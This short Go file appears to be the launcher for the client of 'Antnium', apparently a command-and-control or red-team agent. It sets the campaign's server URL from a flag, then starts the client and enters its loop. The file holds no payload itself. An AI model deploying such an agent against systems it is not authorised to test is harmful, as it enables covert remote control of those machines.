package main

import (
	"flag"
	"fmt"

	"github.com/dobin/antnium/pkg/client"
)

func main() {
	flagClientAddr := flag.String("clientaddr", "", "Server URL for the client")
	flag.Parse()

	fmt.Println("Antnium 0.1")

	c := client.NewClient()

	// Overwrite our server url
	if *flagClientAddr != "" {
		c.Campaign.ServerUrl = *flagClientAddr
	}
	c.Start()
	c.Loop()

}
